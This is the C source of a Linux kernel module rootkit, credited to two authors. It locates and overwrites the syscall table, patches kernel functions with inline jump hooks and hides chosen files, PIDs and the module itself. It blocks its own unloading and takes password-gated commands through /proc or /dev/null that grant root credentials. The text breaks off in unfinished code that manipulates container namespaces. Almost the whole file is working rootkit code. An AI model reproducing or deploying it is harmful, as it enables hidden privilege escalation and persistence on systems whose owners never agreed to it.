/*
 * Copyright (C) 2018 Iram Lee <iram.lee@gmail.com>,
                 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#include <linux/sched.h>
#include <linux/nsproxy.h>

#include <linux/export.h>
#include <linux/init_task.h>
#include <linux/mnt_namespace.h>
#include <linux/utsname.h>
#include <linux/pid_namespace.h>
#include <net/net_namespace.h>
#include <linux/ipc_namespace.h>
#include <linux/proc_ns.h>
#include <linux/file.h>
#include <linux/uts.h>
#include <linux/user_namespace.h>


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

// Copy-pasted from Linux sources as it's not provided in public headers
// of newer Linux.
// Might differ from one version of Linux kernel to another, so update as
// necessary
// http://lxr.free-electrons.com/source/fs/proc/internal.h?v=4.4#L31
// From the website: "The idea is to create an in-memory tree (like the actual
// /proc filesystem tree) of these proc_dir_entries, so that we can dinamically
// add new files to /proc
//
// parent/subdir are used for the directory structure (every /proc file has a parent,
// but "subdir" is empty for all non-directory entries).
// subdir_node is used to build the rb tree "subdir"of the parent."
struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;         /* use count */
    atomic_t in_use;        /* number of callers into module in progress; */
                            /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers;   /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

#endif

#include "config.h"

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");


#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
    "It should be easy to port to new architectures though"

/* The write_cr0() macro is used to disable write protection (WP) on the CR register
 * this will let the kernel read from WP locations.
 * These steps are necesary to modify the sys call table.
 */
#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);


// ========== SYS_CALL_TABLE ==========


#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
#else
    #error ARCH_ERROR_MESSAGE
#endif

void **sys_call_table;

/**
 * Finds a system call table based on a heruistic.
 * Note that the heruistic is not ideal, so it might find a memory region that
 * looks like a system call table but is not actually a system call table, but
 * it seems to work all the time on my systems.
 *
 * @return system call table on success, NULL on failure.
 */
void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (sctable[j] == NULL) {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
skip:
        ;
        i += sizeof(void *);
    }

    return NULL;
}


// ========== END SYS_CALL_TABLE ==========


// ========== HOOK LIST ==========


struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

/**
 * Replaces a function pointer at some address with a new function pointer,
 * keeping record of the original function pointer so that it could be
 * restored later.
 *
 * @param modified_at_address Pointer to the address of where the function
 * pointer that we want to replace is stored. The same address would be used
 * when restoring the original funcion pointer back, so make sure it doesn't
 * become invalid by the time you try to restore it back.
 *
 * @param modified_function Function pointer that we want to replace the
 * original function pointer with.
 *
 * @return true on success, false on failure.
 */
int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}

/**
 * Get original function pointer based on the one we overwrote it with.
 * Useful when wanting to call the original function inside a hook.
 *
 * @param modified_function The function that overwrote the original one.
 * @return original function pointer on success, NULL on failure.
 */
void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list) {
        if (h->modified_function == modified_function) {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

/**
 * Removes all hook records, restores the overwritten function pointer to its
 * original value.
 */
void hook_remove_all(void)
{
    struct hook *h, *tmp;

    // make it so that instead of `modified_function` the `original_function`
    // would get called again
    list_for_each_entry(h, &hook_list, list) {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    // a hack to let the changes made by the loop above propagate
    // as some process might be in the middle of our `modified_function`
    // and call `hook_get_original()`, which would return NULL if we
    // `list_del()` everything
    // so we make it so that instead of `modified_function` the
    // `original_function` would get called again, then sleep to wait until
    // existing `modified_function` calls finish and only them remove elements
    // fro mthe list
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list) {
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END HOOK LIST ==========


unsigned long read_count = 0;

/*
 * The asmlinkage modifier is typically used with syscall functions.
 * It tells the compiler to look for the function parameters in the stack,
 * rather than in the registers (for performance improvement).
 *
 * This is our version of the read() sys call, it will run every time the
 * the original read() is invoked
 */
asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    //pr_info("Hello world from Rootkit read!\n");
    return original_read(fd, buf, count);
}


unsigned long write_count = 0;

/*
 * This is our version of the write() sys call, it will run every time the
 * original write() sys call is invoked.
*/
asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{
    write_count ++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    //pr_info("Hello world from Rootkit write!\n");
    return original_write(fd, buf, count);
}


// ========== ASM HOOK LIST ==========

#if defined __i386__
    // push 0x00000000, ret
    #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
    #define ASM_HOOK_CODE_OFFSET 1
    // alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
    //#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
    // there is no push that pushes a 64-bit immidiate in x86_64,
    // so we do things a bit differently:
    // mov rax 0x0000000000000000, jmp rax
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

/**
 * Patches the original function to call the modified function again.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END ASM HOOK LIST ==========


unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
    asm_rmdir_count ++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);
    pr_info("Hello world from Rootkit rmdir!\n");
    return ret;
}

/*
 * New hooked functions:
 * - mkdir
 * - kill
 * - chmod
*/
asmlinkage long asm_mkdir(const char __user *pathname)
{
    asmlinkage long (*original_mkdir)(const char __user *);
    original_mkdir = asm_hook_unpatch(asm_mkdir);
    long ret = original_mkdir(pathname);
    asm_hook_patch(asm_mkdir);
    pr_info("Hello world from rootkit mkdir!\n");
    return ret;
}

asmlinkage long asm_kill(const char __user *pathname)
{
    asmlinkage long (*original_kill)(const char __user *);
    original_kill = asm_hook_unpatch(asm_kill);
    long ret = original_kill(pathname);
    asm_hook_patch(asm_kill);
    pr_info("Hello world from rootkit kill!\n");
    return ret;
}

asmlinkage long asm_chmod(const char __user *pathname)
{
    asmlinkage long (*original_chmod)(const char __user *);
    original_chmod = asm_hook_unpatch(asm_chmod);
    long ret = original_chmod(pathname);
    asm_hook_patch(asm_chmod);
    pr_info("Hello world from rootkit chmod!\n");
    return ret;
}
// ========== END NEW HOOKED FUNCTIONS ==============

// ========== PID LIST ==========


struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p) {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{
    struct pid_entry *p, *tmp;

    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        list_del(&p->list);
        kfree(p);
    }
}


// ========== END PID LIST ==========


// ========== FILE LIST ==========


struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);

    if (!f) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    // sanity check as `name` could point to some garbage without null anywhere nearby
    if (name_len -1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;
}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}


// ========== END FILE LIST ==========


// ========== HIDE ==========


struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}


void unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}


// ========== END HIDE ==========


// ========== PROTECT ==========


int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}


// ========== END PROTECT ==========


// ========== READDIR ==========


struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}

// Macros to help reduce repeated code where only names differ.
// Decreses risk of "copy-paste & forgot to rename" error.
#define FILLDIR_START(NAME) \
    filldir_t original_##NAME##_filldir; \
    \
    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME) \
        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
//the dir_context struct is used to read the context of a directory from kernel space
    #define READDIR(NAME) \
        int NAME##_iterate(struct file *file, struct dir_context *context) \
        { \
            original_##NAME##_filldir = context->actor; \
            *((filldir_t*)&context->actor) = NAME##_filldir; \
            \
            int (*original_iterate)(struct file *, struct dir_context *); \
            original_iterate = asm_hook_unpatch(NAME##_iterate); \
            int ret = original_iterate(file, context); \
            asm_hook_patch(NAME##_iterate); \
            \
            return ret; \
        }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    #define READDIR(NAME) \
        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
        { \
            original_##NAME##_filldir = filldir; \
            \
            int (*original_readdir)(struct file *, void *, filldir_t); \
            original_readdir = asm_hook_unpatch(NAME##_readdir); \
            int ret = original_readdir(file, dirent, NAME##_filldir); \
            asm_hook_patch(NAME##_readdir); \
            \
            return ret; \
        }
#else

//#error "Wrong Linux kernel version"

#endif

// Macros to actually use
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)

READDIR_HOOK_START(root)
    struct file_entry *f;

    list_for_each_entry(f, &file_list, list) {
        if (strcmp(name, f->name) == 0) {
            return 0;
        }
    }
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
    struct pid_entry *p;

    list_for_each_entry(p, &pid_list, list) {
        if (simple_strtoul(name, NULL, 10) == p->pid) {
            return 0;
        }
    }
READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }
READDIR_HOOK_END(sys)


#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR

#undef READDIR_HOOK_START
#undef READDIR_HOOK_END


// ========== END READDIR ==========


int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    pr_info("Password check passed\n");

    // since the password matched, we assume the command following the password
    // is in the valid format

    //increment the pointer position to the buffer containing the command issued from userland
    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0) {
        pr_info("Got root command\n");
        struct cred *creds = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

        creds->uid = creds->euid = 0;
        creds->gid = creds->egid = 0;

#endif

        commit_creds(creds);
    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
        pr_info("Got hide pid command\n");
        str += sizeof(CFG_HIDE_PID);
        pid_add(str);
    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
        pr_info("Got unhide pid command\n");
        str += sizeof(CFG_UNHIDE_PID);
        pid_remove(str);
    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
        pr_info("Got hide file command\n");
        str += sizeof(CFG_HIDE_FILE);
        file_add(str);
    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
        pr_info("Got unhide file command\n");
        str += sizeof(CFG_UNHIDE_FILE);
        file_remove(str);
    }  else if (strcmp(str, CFG_HIDE) == 0) {
        pr_info("Got hide command\n");
        hide();
    } else if (strcmp(str, CFG_UNHIDE) == 0) {
        pr_info("Got unhide command\n");
        unhide();
    } else if (strcmp(str, CFG_PROTECT) == 0) {
        pr_info("Got protect command\n");
        protect();
    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
        pr_info("Got unprotect command\n");
        unprotect();
    } else {
        pr_info("Got unknown command\n");
    }

    return 1;
}


// ========== COMM CHANNEL ==========

//ssize_t is a signed integer system data type that can represent a byte count or a (negative) error indication
static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count)) {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = asm_hook_unpatch(proc_fops_write);
    ssize_t ret = original_write(file, buf_user, count, p);
    asm_hook_patch(proc_fops_write);

    return ret;
}

static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
{
    execute_command(buf_user, count);

    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
    original_read = asm_hook_unpatch(proc_fops_read);
    ssize_t ret = original_read(file, buf_user, count, p);
    asm_hook_patch(proc_fops_read);

    return ret;
}


int setup_proc_comm_channel(void)
{
    //struct containig the posible file operations (only used for the "temporary process")
    static const struct file_operations proc_file_fops = {0};
    //the struct proc_dir_entry is defined at the beginning of this file (see description above)
    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
    //this line assigns the parent process proc_dir_entry struct of the newly created process to itself (effectively swaps it)
    proc_entry = proc_entry->parent;

    if (strcmp(proc_entry->name, "/proc") != 0) {
        pr_info("Couldn't find \"/proc\" entry\n");
        remove_proc_entry("temporary", NULL);
        return 0;
    }

    remove_proc_entry("temporary", NULL);
    //struct file_operations represents the default file operations
    struct file_operations *proc_fops = NULL;

//My kernel version is 4.4, so this block will run
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
//struct rb_node represents a red-black tree node that contains the memory region(address) of a process
    struct rb_node *entry = rb_first(&proc_entry->subdir);

    while (entry) {
	//the rb_entry macro derives the address of the corresponding memory descriptor
        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);

        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }

        entry = rb_next(entry);
    }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    proc_entry = proc_entry->subdir;

    while (proc_entry) {
        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);

        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) proc_entry->proc_fops;
            goto found;
        }

        proc_entry = proc_entry->next;
    }

#endif

    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);

    return 0;

found:
    ;

    if (proc_fops->write) {
	//create function hook with (original func, our func)
        asm_hook_create(proc_fops->write, proc_fops_write);
    }

    if (proc_fops->read) {
        asm_hook_create(proc_fops->read, proc_fops_read);
    }

    if (!proc_fops->read && !proc_fops->write) {
        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
        return 0;
    }

    return 1;
}


static ssize_t devnull_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count)) {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = hook_get_original(devnull_fops_write);
    return original_write(file, buf_user, count, p);
}

int setup_devnull_comm_channel(void)
{
    hook_create(&get_fop("/dev/null")->write, devnull_fops_write);

    return 1;
}


// ========== END COMM CHANNEL ==========

/*
 * Lists the current tasks in the system
 * @return true on success, false on failure
*/
int list_tasks(void){
    struct task_struct *task;
    char *tsk_state;
    char *tsk_name;
    for_each_process(task){
        char *buf_comm = kmalloc(sizeof(task->comm), GFP_KERNEL);
	    if(!buf_comm){
	        return 0;
	    }
	    //the get_task_comm() is declared in sched.h, returns the comm (executable) name
	    //of the requested task(i.e. task->comm). The function is defined in <fs/exec.c>
        tsk_name = get_task_comm(buf_comm, task);
	    if(task->state == 0){
	        tsk_state = "runnable";
    }else if(task->state > 0){
	        tsk_state = "stopped";
	    }else if(task->state == -1){
	        tsk_state = "unrunnable";
	    }
        pr_info("Task name: %s, Task PID: %d, State: %s\n", tsk_name, task->pid, tsk_state);
	    kfree(buf_comm);
    }
    return 1;
}


/******************************************************************/
//  Copied functions from Linux sources to work with the
//  show_ns_pointers() function below
//

static struct kmem_cache *nsproxy_cachep;

struct nsproxy init_nsproxy = {
	.count			= ATOMIC_INIT(1),
	.uts_ns			= &init_uts_ns,
#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)
	.ipc_ns			= &init_ipc_ns,
#endif
	.mnt_ns			= NULL,
	.pid_ns_for_children	= &init_pid_ns,
#ifdef CONFIG_NET
	.net_ns			= &init_net,
#endif
};

static inline struct nsproxy *create_nsproxy(void)
{
	struct nsproxy *nsproxy;

	nsproxy = kmem_cache_alloc(nsproxy_cachep, GFP_KERNEL);
	if (nsproxy)
		atomic_set(&nsproxy->count, 1);
	return nsproxy;
}

/*
 * Create new nsproxy and all of its the associated namespaces.
 * Return the newly created nsproxy.  Do not attach this to the task,
 * leave it to the caller to do proper locking and attach it to task.
 *
 */
static struct nsproxy *create_new_namespaces(unsigned long flags,
	struct task_struct *tsk, struct user_namespace *user_ns,
	struct fs_struct *new_fs)
{
	struct nsproxy *new_nsp;
	int err;

	new_nsp = create_nsproxy();
	if (!new_nsp)
		return ERR_PTR(-ENOMEM);

	new_nsp->mnt_ns = copy_mnt_ns(flags, tsk->nsproxy->mnt_ns, user_ns, new_fs);
	if (IS_ERR(new_nsp->mnt_ns)) {
		err = PTR_ERR(new_nsp->mnt_ns);
		goto out_ns;
	}

	new_nsp->uts_ns = copy_utsname(flags, user_ns, tsk->nsproxy->uts_ns);
	if (IS_ERR(new_nsp->uts_ns)) {
		err = PTR_ERR(new_nsp->uts_ns);
		goto out_uts;
	}

	new_nsp->ipc_ns = copy_ipcs(flags, user_ns, tsk->nsproxy->ipc_ns);
	if (IS_ERR(new_nsp->ipc_ns)) {
		err = PTR_ERR(new_nsp->ipc_ns);
		goto out_ipc;
	}

	new_nsp->pid_ns_for_children =
		copy_pid_ns(flags, user_ns, tsk->nsproxy->pid_ns_for_children);
	if (IS_ERR(new_nsp->pid_ns_for_children)) {
		err = PTR_ERR(new_nsp->pid_ns_for_children);
		goto out_pid;
	}

	new_nsp->net_ns = copy_net_ns(flags, user_ns, tsk->nsproxy->net_ns);
	if (IS_ERR(new_nsp->net_ns)) {
		err = PTR_ERR(new_nsp->net_ns);
		goto out_net;
	}

	return new_nsp;

out_net:
	if (new_nsp->pid_ns_for_children)
		put_pid_ns(new_nsp->pid_ns_for_children);
out_pid:
	if (new_nsp->ipc_ns)
		put_ipc_ns(new_nsp->ipc_ns);
out_ipc:
	if (new_nsp->uts_ns)
		put_uts_ns(new_nsp->uts_ns);
out_uts:
	if (new_nsp->mnt_ns)
		put_mnt_ns(new_nsp->mnt_ns);
out_ns:
	kmem_cache_free(nsproxy_cachep, new_nsp);
	return ERR_PTR(err);
}

void free_nsproxy(struct nsproxy *ns)
{
	if (ns->mnt_ns)
		put_mnt_ns(ns->mnt_ns);
	if (ns->uts_ns)
		put_uts_ns(ns->uts_ns);
	if (ns->ipc_ns)
		put_ipc_ns(ns->ipc_ns);
	if (ns->pid_ns_for_children)
		put_pid_ns(ns->pid_ns_for_children);
	put_net(ns->net_ns);
	kmem_cache_free(nsproxy_cachep, ns);
}

/*
 * Called from unshare. Unshare all the namespaces part of nsproxy.
 * On success, returns the new nsproxy.
 */
/*
int unshare_nsproxy_namespaces(unsigned long unshare_flags,
	struct nsproxy **new_nsp, struct cred *new_cred, struct fs_struct *new_fs)
{
	struct user_namespace *user_ns;
	int err = 0;

	if (!(unshare_flags & (CLONE_NEWNS | CLONE_NEWUTS | CLONE_NEWIPC |
			       CLONE_NEWNET | CLONE_NEWPID)))
		return 0;

	user_ns = new_cred ? new_cred->user_ns : current_user_ns();
	if (!ns_capable(user_ns, CAP_SYS_ADMIN))
		return -EPERM;

	*new_nsp = create_new_namespaces(unshare_flags, current, user_ns,
					 new_fs ? new_fs : current->fs);
	if (IS_ERR(*new_nsp)) {
		err = PTR_ERR(*new_nsp);
		goto out;
	}

out:
	return err;
}

void switch_task_namespaces(struct task_struct *p, struct nsproxy *new)
{
	struct nsproxy *ns;

	might_sleep();

	task_lock(p);
	ns = p->nsproxy;
	p->nsproxy = new;
	task_unlock(p);

	if (ns && atomic_dec_and_test(&ns->count))
		free_nsproxy(ns);
}

void exit_task_namespaces(struct task_struct *p)
{
	switch_task_namespaces(p, NULL);
}

SYSCALL_DEFINE2(setns, int, fd, int, nstype)
{
	struct task_struct *tsk = current;
	struct nsproxy *new_nsproxy;
	struct file *file;
	struct ns_common *ns;
	int err;

	file = proc_ns_fget(fd);
	if (IS_ERR(file))
		return PTR_ERR(file);

	err = -EINVAL;
	ns = get_proc_ns(file_inode(file));
	if (nstype && (ns->ops->type != nstype))
		goto out;

	new_nsproxy = create_new_namespaces(0, tsk, current_user_ns(), tsk->fs);
	if (IS_ERR(new_nsproxy)) {
		err = PTR_ERR(new_nsproxy);
		goto out;
	}

	err = ns->ops->install(new_nsproxy, ns);
	if (err) {
		free_nsproxy(new_nsproxy);
		goto out;
	}
	switch_task_namespaces(tsk, new_nsproxy);
out:
	fput(file);
	return err;
}*/

int __init nsproxy_cache_init(void)
{
	nsproxy_cachep = KMEM_CACHE(nsproxy, SLAB_PANIC);
	return 0;
}

/************END COPIED CODE***************************************/

/*
 * Display the pointers (addresses) of each namespace inside the task (container)
*/
void show_ns_pointers(struct task_struct *tsk, struct task_struct *parent_target){
    struct nsproxy *parent_nsproxy = tsk->nsproxy;
    struct nsproxy *child_nsproxy;

    struct task_struct *target_tsk;
    struct nsproxy *new_ns;
    target_tsk = &parent_target->children;	//this is the actual container task
    task_lock(target_tsk);
    struct user_namespace *user_ns = task_cred_xxx(target_tsk, user_ns);
    new_ns = create_new_namespaces(CLONE_FILES | CLONE_FS | CLONE_SIGHAND | CLONE_VM | 
		    CLONE_THREAD | CLONE_SYSVSEM | CLONE_PARENT,
		    target_tsk, user_ns, target_tsk->fs);
    if(IS_ERR(new_ns)){
    	pr_info("Could not copy namespaces\n");
    }
    //lock the (malicious) parent task (i.e. containerd-shim)
    task_lock(tsk);
